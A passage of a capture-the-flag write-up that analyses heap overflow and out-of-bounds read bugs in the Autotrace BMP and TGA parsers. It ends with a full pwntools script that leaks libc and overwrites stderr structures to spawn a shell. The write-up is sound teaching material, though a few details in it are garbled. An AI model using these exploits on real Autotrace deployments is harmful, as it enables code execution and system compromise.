</code></pre></div><p>The <code>image</code> variable is used to store the chunk of pixel data, with a maximum size of <code>width * height * 3 * sizeof(unsigned char)</code>&hellip; wait, why is it multiplied by 3? It&rsquo;s because a pixel has three different data values for RGB. However, based on the code logic above, the <code>channels</code> can be assigned as 4, which means a pixel can have four different data values for RGBA. Come on, be optimistic. Perhaps the variable <code>channels</code> is not used later in the code.</p>
<p>Now, let&rsquo;s see when the <code>image</code> variable is used. In <code>input-bmp.c:631</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">rowstride <span style="color:#f92672">=</span> width <span style="color:#f92672">*</span> channels;

ypos <span style="color:#f92672">=</span> height <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;

<span style="color:#66d9ef">switch</span> (bpp) {

  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">32</span><span style="color:#f92672">:</span>
    ...
    <span style="color:#66d9ef">break</span>;

  <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">24</span><span style="color:#f92672">:</span>
    {
      <span style="color:#66d9ef">while</span> (ReadOK (fd, row_buf, rowbytes))
      {
        temp <span style="color:#f92672">=</span> image <span style="color:#f92672">+</span> (ypos <span style="color:#f92672">*</span> rowstride);
        <span style="color:#66d9ef">for</span> (xpos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; xpos <span style="color:#f92672">&lt;</span> width; <span style="color:#f92672">++</span>xpos) {
          <span style="color:#f92672">*</span>(temp<span style="color:#f92672">++</span>) <span style="color:#f92672">=</span> row_buf[xpos <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>];
          <span style="color:#f92672">*</span>(temp<span style="color:#f92672">++</span>) <span style="color:#f92672">=</span> row_buf[xpos <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>];
          <span style="color:#f92672">*</span>(temp<span style="color:#f92672">++</span>) <span style="color:#f92672">=</span> row_buf[xpos <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span>];
        }

	<span style="color:#66d9ef">if</span> (ypos <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
	  <span style="color:#66d9ef">break</span>;

        <span style="color:#f92672">--</span>ypos; <span style="color:#75715e">/* next line */</span>
      }
    }
    <span style="color:#66d9ef">break</span>;
	
	<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">:</span>
		...
		<span style="color:#66d9ef">break</span>;
	
	...
}
</code></pre></div><p>TL;DR: The parser copies the pixel data from the source <code>image</code> to the image chunk, and <code>temp</code> points to the current position where the data is being copied.</p>
<p>Pay attention to the line <code>*(temp++) = row_buf[xpos * 3 + 2];</code>. Regardless of what <code>row_buf</code> is, <code>temp</code> should be within the range of the <code>image</code> heap chunk, right? Otherwise, it could cause a &ldquo;write out of bounds&rdquo; situation.</p>
<p>Since <code>temp = image + (ypos * rowstride);</code>, to avoid writing out of bounds, <code>ypos * rowstride</code> should be less than the size of the image chunk (<code>width * height * 3</code>).</p>
<p>Well, what are the initial values of <code>ypos</code> and <code>rowstride</code>? According to the code logic, they are <code>width * channels</code> and <code>height - 1</code>, respectively. So the initial value of <code>ypos * rowstride</code> is <code>width * channels * (height - 1)</code>&hellip; wait again, I remember seeing that <code>channels</code> can be a maximum of 4.</p>
<p>Can <code>4w(h-1)</code> be greater than <code>3wh</code>? Obviously yes! In other words, it can cause a &ldquo;write out of bounds&rdquo; situation. Here&rsquo;s the heap overflow vulnerability.</p>
<h3 id="exploiting-input-bmp">Exploiting input-bmp<a hidden class="anchor" aria-hidden="true" href="#exploiting-input-bmp">#</a></h3>
<p>The vulnerability we found unexpectedly turns out to be quite useful for two reasons:</p>
<ol>
<li>It allows us to specific the location to write. When the parser copies the data, it starts from the last line, <code>image + 4w(h-1) + 0</code>, <code>image + 4w(h-1) + 1</code>, and so on, instead of <code>image + 0</code>, <code>image + 1</code> which would unavoidably write into a read-only chunk before hitting the desired location, leading to a segmentation fault. Starting from the last line allows us to skip the read-only chunk and directly overwrite the desired location.</li>
<li>The loop <code>while (ReadOK(fd, row_buf, rowbytes))</code> immediately exits when it reaches the end of the input image (EOF) as fd. This means we can avoid some issues about the width and height values being too large and causing the input image size to exceed stdin&rsquo;s capacity. It also &ldquo;accidentally&rdquo; bypasses the check <code>file_size &gt;= 0x1000</code> in this pwn challenge.</li>
</ol>
<p>First, we can set the bpp and mask in the input BMP image header to trigger the vulnerability with a channels value of 4. Then, by calculating an appropriate height and width in the header, we can overwrite the contents of specific positions below the image chunk. As a pwner&rsquo;s trick, we can guarantee the dynamic libraries (e.g., libc) will locate below our malloced image chunk by asking a chunk with a very large size, i.e. high <code>channel * width * height</code> value. It is because malloc will switch to using mmap if the user requested a chunk of sufficiently high in size.</p>
<p>If you can modify the contents of the libc, there are many methods to obtain a shell, such as modifying the libc&rsquo;s Global Offset Table (GOT) or utilizing different techniques from the House of xxx series. However, these methods usually require a prior leaked libc address to bypass ASLR randomization. We would need a 0-day info leak for that!</p>
<h3 id="input-tga">input-tga<a hidden class="anchor" aria-hidden="true" href="#input-tga">#</a></h3>
<p>I couldn&rsquo;t find any information leak vulnerability in the <code>input-bmp.c</code> file after reviewing it, so it&rsquo;s time to look at other files.</p>
<p>Among the suspicious files in the watch list are <code>input-tga.c</code>, <code>input-pnm.c</code>, and <code>color.c</code>. Skipping to the conclusion, there is no bug in <code>color.c</code>, and although <code>input-pnm.c</code> has a bug, it is not exploitable&hellip; ya, not all bugs can be exploited. For example, bugs that trigger an immediate segmentation fault are useless in this case, even though they can be used to claim a CVE.</p>
<p>Finally, only <code>input-tga.c</code> remains on the list.</p>
<p>But before we start the code review, let&rsquo;s imagine what an information leak vulnerability is. In traditional pwn challenges, an information leak usually refers to using the <code>write</code> or <code>printf</code> function to leak important addresses from residual memory like putting a non-null-terminated string. However, this method is not applicable in Autotrace because it doesn&rsquo;t have an interactive prompt. Its only output is a vector image. So, let&rsquo;s think in reverse. Since the output is just an image, can we include leaked information in that image?</p>
<p>Fortunately, TGA has something suitable for this purpose — the color map.</p>
<p>
  <figure class="center" >
    <img src="/images/2024-03-10-b6actf-image-factory/tga-file-format.png"   />
    
  </figure>


png)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _TgaHeader
{
  BYTE IDLength;        <span style="color:#75715e">/* 00h  Size of Image ID field */</span>
  BYTE ColorMapType;    <span style="color:#75715e">/* 01h  Color map type */</span>
  BYTE ImageType;       <span style="color:#75715e">/* 02h  Image type code */</span>
  WORD CMapStart;       <span style="color:#75715e">/* 03h  Color map origin */</span>
  WORD CMapLength;      <span style="color:#75715e">/* 05h  Color map length */</span>
  BYTE CMapDepth;       <span style="color:#75715e">/* 07h  Depth of color map entries */</span>
  WORD XOffset;         <span style="color:#75715e">/* 08h  X origin of image */</span>
  WORD YOffset;         <span style="color:#75715e">/* 0Ah  Y origin of image */</span>
  WORD Width;           <span style="color:#75715e">/* 0Ch  Width of image */</span>
  WORD Height;          <span style="color:#75715e">/* 0Eh  Height of image */</span>
  BYTE PixelDepth;      <span style="color:#75715e">/* 10h  Image pixel size */</span>
  BYTE ImageDescriptor; <span style="color:#75715e">/* 11h  Image descriptor byte */</span>
} TGAHEAD;
</code></pre></div><p>TL;DR: When storing colors in TGA format, it can use the Indexed Color Mode, where each pixel doesn&rsquo;t directly store RGB values but instead stores as an index. The TGA header contains a color map data chunk, and the RGB values of pixels refer to color map  <code>data[index]</code>. If Autotrace has a flaw in implementing this feature, such as accepting a large or negative index for a pixel, there might be a chance for me to read beyond the boundaries.</p>
<p>After understanding the color map concept, let&rsquo;s proceed with the code review. First, let&rsquo;s look at the implementation of &ldquo;the RGB values of a pixel refer to color map data[index]&rdquo; in <code>input-tga.c:520</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> (hdr<span style="color:#f92672">-&gt;</span>colorMapType <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>temp, <span style="color:#f92672">*</span>temp2, <span style="color:#f92672">*</span>temp3;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> index;
    <span style="color:#66d9ef">int</span> xpos, ypos;

    temp2 <span style="color:#f92672">=</span> temp <span style="color:#f92672">=</span> image.bitmap;
    image.bitmap <span style="color:#f92672">=</span> temp3 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)malloc(width <span style="color:#f92672">*</span> height <span style="color:#f92672">*</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>));

    <span style="color:#66d9ef">for</span> (ypos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ypos <span style="color:#f92672">&lt;</span> height; ypos<span style="color:#f92672">++</span>) {
      <span style="color:#66d9ef">for</span> (xpos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; xpos <span style="color:#f92672">&lt;</span> width; xpos<span style="color:#f92672">++</span>) {
        index <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>temp2<span style="color:#f92672">++</span>;
        <span style="color:#f92672">*</span>temp3<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> cmap[<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> index <span style="color:#f92672">+</span> <span style="color:#ae81ff">0</span>];
        <span style="color:#f92672">*</span>temp3<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> cmap[<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> index <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>];
        <span style="color:#f92672">*</span>temp3<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> cmap[<span style="color:#ae81ff">3</span> <span style="color:#f92672">*</span> index <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>];
      }
    }
    free(temp);
    free(cmap);
  }
</code></pre></div><p>The RGB values of a pixel are <code>cmap[3 * index + 0]</code>, <code>cmap[3 * index + 1]</code>, and <code>cmap[3 * index + 2]</code>. Since the index is an unsigned char, it can&rsquo;t be negative, but its maximum value is 0xff. Therefore, it can read up to cmap[3 * index + 2] = cmap[767]. If the size of the cmap chunk is less than 767, it means I can read beyond the boundaries!</p>
<p>What? Checking of the index? Sorry, after going through it, there is no such thing exists.</p>
<p>Getting back to the point, let&rsquo;s see where cmap is created. <code>input-tga.c:368</code> :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> (hdr<span style="color:#f92672">-&gt;</span>colorMapType <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
    <span style="color:#75715e">/* We need to read in the colormap. */</span>
    <span style="color:#66d9ef">int</span> index, colors;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> length;

    index <span style="color:#f92672">=</span> (hdr<span style="color:#f92672">-&gt;</span>colorMapIndexHi <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> hdr<span style="color:#f92672">-&gt;</span>colorMapIndexLo;
    length <span style="color:#f92672">=</span> (hdr<span style="color:#f92672">-&gt;</span>colorMapLengthHi <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> hdr<span style="color:#f92672">-&gt;</span>colorMapLengthLo;

    <span style="color:#66d9ef">if</span> (length <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
      LOG(<span style="color:#e6db74">&#34;TGA: invalid color map length %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, length);
      at_exception_fatal(exp, <span style="color:#e6db74">&#34;TGA: invalid color map length&#34;</span>);
      <span style="color:#66d9ef">return</span> image;
    }

    pelbytes <span style="color:#f92672">=</span> ROUNDUP_DIVIDE(hdr<span style="color:#f92672">-&gt;</span>colorMapSize, <span style="color:#ae81ff">8</span>);
    colors <span style="color:#f92672">=</span> length <span style="color:#f92672">+</span> index;
    cmap <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)malloc(colors <span style="color:#f92672">*</span> pelbytes);

    ...
</code></pre></div><p><code>cmap</code> is a chunk allocated using malloc, with a size of <code>colors * pelbytes</code>.</p>
<p><code>colors</code> is obtained by dividing <code>hdr-&gt;colorMapSize</code> by 8 and rounding up. <code>pelbytes</code> is <code>(hdr-&gt;colorMapIndexHi &lt;&lt; 8) | hdr-&gt;colorMapIndexLo</code> + <code>(hdr-&gt;colorMapLengthHi &lt;&lt; 8) | hdr-&gt;colorMapLengthLo</code>. <code>hdr</code> is the image header, which means it&rsquo;s user input, so all <code>hdr-&gt;*</code> are set by the user.</p>
<p>Great! I can make <code>cmap</code> equal to malloc(8), and then set the color of a pixel to cmap[767]. It&rsquo;s a very useful access out-of-bounds vulnerability.</p>
<h3 id="exploiting-input-tga">Exploiting input-tga<a hidden class="anchor" aria-hidden="true" href="#exploiting-input-tga">#</a></h3>
<p>First, craft a TGA image with a small <code>colors * pelbytes</code> but with an index reaching 0xff. Inject it into the program and see if it crashes or shows any errors. It&rsquo;s not! Run it in gdb and observe that it indeed reads beyond the boundaries! POC done!</p>
<p>Then, using gdb, check if there is any address of libc or any library within the range of cmap+0 to +767 (because the offset between such addresses and libc addresses is fixed). And I found one!</p>
<p>Finally, create a TGA image with the same technique as the POC. In this image, only two pixels are set. As long as the index of a pixel matches the desired address to leak, Autotrace will treat that address as an RGB value and output it as a vector image.</p>
<p>For example (input: leak0.tga; output format svg):</p>
<blockquote>
<?xml version="1.0" standalone="yes"?>
<p>&lt;svg xmlns=&ldquo;<a href="http://www.w3.org/2000/svg%22">http://www.w3.org/2000/svg&quot;</a> width=&ldquo;1&rdquo; height=&ldquo;2&rdquo;&gt;
&lt;path style=&ldquo;fill:#329b0c; stroke:none;&rdquo; d=&ldquo;M0 0L1 1L0 0z&rdquo;/&gt;
&lt;path style=&ldquo;fill:#cb7f00; stroke:none;&rdquo; d=&ldquo;M0 1L1 2L0 1z&rdquo;/&gt;
&lt;/svg&gt;</p>
</blockquote>
<p>That&rsquo;s how I leaked the library address 0x007fcb0c9b32.</p>
<h2 id="final-solve-script">Final solve script<a hidden class="anchor" aria-hidden="true" href="#final-solve-script">#</a></h2>
<p>Keep it short and simple, I first used the TGA exploit to leak the address, then calculated the libc base address using the offset, and finally used the BMP exploit to overwrite the contents of libc and get a shell. Here, I chose the house of apple technique to modify the IO_2_1_stderr field.</p>
<div class="alert info">
  <p>File payload</p>
<ul>
<li><a href="https://github.com/blackb6a/blackb6a-ctf-2023-challenges/raw/main/34-image-factory/src/leak0.tga">leak0.tga</a></li>
<li><a href="https://github.com/blackb6a/blackb6a-ctf-2023-challenges/raw/main/34-image-factory/src/overwrite.template">overwrite.temp</a></li>
</ul>
<p>*Note that the leak offset in leak0.tga is highly associated with the hosting machine enviornment.</p>

</div>
  
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;chall.pwnable.hk&#39;</span>, <span style="color:#ae81ff">20010</span>)
<span style="color:#75715e"># ====</span>

<span style="color:#75715e"># utils</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_hash</span>(prefix, answer, difficulty):
    h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256()
    h<span style="color:#f92672">.</span>update((prefix <span style="color:#f92672">+</span> answer)<span style="color:#f92672">.</span>encode())
    bits <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(bin(i)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">8</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> h<span style="color:#f92672">.</span>digest())
    <span style="color:#66d9ef">return</span> bits<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">*</span> difficulty)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve_pow</span>(prefix, difficulty):
    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> verify_hash(prefix, str(i), difficulty):
        i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
    <span style="color:#66d9ef">return</span> str(i)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_file_format</span>(file_name):
    <span style="color:#66d9ef">return</span> file_name<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">extract_address_from_svg</span>(leak):
    leaks <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;style=&#34;fill:#&#39;</span>)
    <span style="color:#66d9ef">return</span> leaks[<span style="color:#ae81ff">1</span>][:<span style="color:#ae81ff">6</span>]<span style="color:#f92672">+</span>leaks[<span style="color:#ae81ff">2</span>][:<span style="color:#ae81ff">6</span>]

<span style="color:#75715e"># functions</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">convert</span>(r, file_name, to_format, end <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>):
    file_format <span style="color:#f92672">=</span> get_file_format(file_name)
    r<span style="color:#f92672">.</span>sendline(file_format)
    r<span style="color:#f92672">.</span>sendline(to_format)
    <span style="color:#66d9ef">with</span> open(file_name, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
        file_content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
        r<span style="color:#f92672">.</span>sendline(str(len(file_content)))
        r<span style="color:#f92672">.</span>send(file_content)
    result <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;continue?&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>]
    <span style="color:#75715e"># log.info(result)</span>
    <span style="color:#66d9ef">if</span> end <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;y&#39;</span>)
    <span style="color:#66d9ef">else</span>:
        r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;n&#39;</span>)
        
    <span style="color:#66d9ef">return</span> result

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">craft_exploit_bmp_file</span>(libc_base, lib_top):
    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/usr/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calc_h</span>(target, lib_top, w):
        <span style="color:#75715e"># solve h given (3*w*h) / 0x1000 *0x1000 +0x1000 - 0x10 + target - lib_top = 4*w*(h-1) </span>
        <span style="color:#66d9ef">return</span> (((target <span style="color:#f92672">-</span> lib_top) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">12</span>) <span style="color:#f92672">+</span> ((target <span style="color:#f92672">-</span> lib_top <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x1000</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span> ) <span style="color:#f92672">//</span> w0
    
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">address_to_bitmap_data</span>(addr):
        <span style="color:#66d9ef">return</span> p64(addr)[<span style="color:#ae81ff">2</span>::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> p64(addr)[<span style="color:#ae81ff">5</span>:<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>

    <span style="color:#75715e"># Perform attack 4 times by crafting 4 bmp files</span>

    <span style="color:#75715e"># overwrite0</span>
    target0 <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;_IO_2_1_stderr_&#39;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># forged _wide_vtable address</span>
    w0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
    h0 <span style="color:#f92672">=</span> calc_h(target0, lib_top, w0)
    system_addr <span style="color:#f92672">=</span> libc_base<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]

    <span style="color:#75715e"># overwrite1</span>
    target1 <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;_IO_2_1_stdin_&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x120</span> <span style="color:#75715e"># _IO_wide_data_2._wide_vtable</span>
    w1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
    h1 <span style="color:#f92672">=</span> calc_h(target1, lib_top, w1)
    forged_wide_vtable_addr <span style="color:#f92672">=</span> target0 <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x68</span>

    <span style="color:#75715e"># overwrite2</span>
    target2 <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;_IO_2_1_stderr_&#39;</span>] <span style="color:#75715e"># stderr</span>
    w2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
    h2 <span style="color:#f92672">=</span> calc_h(target2, lib_top, w2)

    <span style="color:#75715e"># overwrite3</span>
    target3 <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;_IO_2_1_stderr_&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">216</span> <span style="color:#75715e"># _IO_2_1_stderr_.vtable</span>
    w3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
    h3 <span style="color:#f92672">=</span> calc_h(target3, lib_top, w3)
    forged_vtable_addr <span style="color:#f92672">=</span> libc_base<span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;_IO_wfile_jumps&#39;</span>] <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x48</span> <span style="color:#75715e"># forged vtable address</span>
    
    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./payload/overwrite.template&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> template_file:
        template <span style="color:#f92672">=</span> template_file<span style="color:#f92672">.</span>read()
        overwrite0_content <span style="color:#f92672">=</span> template[:<span style="color:#ae81ff">0x12</span>] <span style="color:#f92672">+</span> p32(w0) <span style="color:#f92672">+</span> p32(h0) <span style="color:#f92672">+</span> template[<span style="color:#ae81ff">0x12</span>:] <span style="color:#f92672">+</span> address_to_bitmap_data(system_addr)
        overwrite1_content <span style="color:#f92672">=</span> template[:<span style="color:#ae81ff">0x12</span>] <span style="color:#f92672">+</span> p32(w1) <span style="color:#f92672">+</span> p32(h1) <span style="color:#f92672">+</span> template[<span style="color:#ae81ff">0x12</span>:] <span style="color:#f92672">+</span> address_to_bitmap_data(forged_wide_vtable_addr)
        overwrite2_content <span style="color:#f92672">=</span> template[:<span style="color:#ae81ff">0x12</span>] <span style="color:#f92672">+</span> p32(w2) <span style="color:#f92672">+</span> p32(h2) <span style="color:#f92672">+</span> template[<span style="color:#ae81ff">0x12</span>:] <span style="color:#f92672">+</span> address_to_bitmap_data(u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;  sh</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>))
        overwrite3_content <span style="color:#f92672">=</span> template[:<span style="color:#ae81ff">0x12</span>] <span style="color:#f92672">+</span> p32(w3) <span style="color:#f92672">+</span> p32(h3) <span style="color:#f92672">+</span> template[<span style="color:#ae81ff">0x12</span>:] <span style="color:#f92672">+</span> address_to_bitmap_data(forged_vtable_addr)
        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./payload/overwrite0.bmp&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> fow0:
            fow0<span style="color:#f92672">.</span>write(overwrite0_content)
        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./payload/overwrite1.bmp&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> fow1:
            fow1<span style="color:#f92672">.</span>write(overwrite1_content)
        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./payload/overwrite2.bmp&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> fow2:
            fow2<span style="color:#f92672">.</span>write(overwrite2_content)
        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./payload/overwrite3.bmp&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> fow3:
            fow3<span style="color:#f92672">.</span>write(overwrite3_content)

<span style="color:#75715e"># ====</span>
<span style="color:#75715e"># POW</span>
r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;sha256(&#39;</span>)
prefix <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; + &#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>]
answer <span style="color:#f92672">=</span> solve_pow(prefix<span style="color:#f92672">.</span>decode(), <span style="color:#ae81ff">22</span>)
r<span style="color:#f92672">.</span>sendline(answer)

<span style="color:#75715e"># leak libs info by tga parser bug</span>
leak <span style="color:#f92672">=</span> convert(r, <span style="color:#e6db74">&#39;./payload/leak0.tga&#39;</span>, <span style="color:#e6db74">&#39;svg&#39;</span>)
libc_info <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;00&#39;</span><span style="color:#f92672">+</span>extract_address_from_svg(leak)
<span style="color:#75715e"># the offset 0x21a200 is only fixed on Ubuntu 23.04 (HOST) machine</span>
libc_base <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(bytes<span style="color:#f92672">.</span>fromhex(libc_info), byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;little&#39;</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x21a200</span>
print(<span style="color:#e6db74">&#34;libc base: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(libc_base))
top_lib_addr <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x62a1000</span>
print(<span style="color:#e6db74">&#34;top lib: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(top_lib_addr))

<span style="color:#75715e"># perform &#34;house of apple&#34; by bmp parser bug</span>
craft_exploit_bmp_file(libc_base, top_lib_addr)
convert(r, <span style="color:#e6db74">&#39;./payload/overwrite0.bmp&#39;</span>, <span style="color:#e6db74">&#39;svg&#39;</span>)
convert(r, <span style="color:#e6db74">&#39;./payload/overwrite1.bmp&#39;</span>, <span style="color:#e6db74">&#39;svg&#39;</span>)
convert(r, <span style="color:#e6db74">&#39;./payload/overwrite2.bmp&#39;</span>, <span style="color:#e6db74">&#39;svg&#39;</span>)
convert(r, <span style="color:#e6db74">&#39;./payload/overwrite3.bmp&#39;</span>, <span style="color:#e6db74">&#39;svg&#39;</span>, <span style="color:#ae81ff">1</span>)

r<span style="color:#f92672">.</span>interactive()
</code></pre></div>
</div>
  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
      <li><a href="https://b6a.black/tags/bauhinia-ctf/">bauhinia-ctf</a></li>
    </ul>
    <nav class="paginav">
      <a class="prev" href="https://b6a.black/posts/2024-08-23-b6a-newsletter-vol1/">
        <span class="title">« Prev Page</span>
        <br>
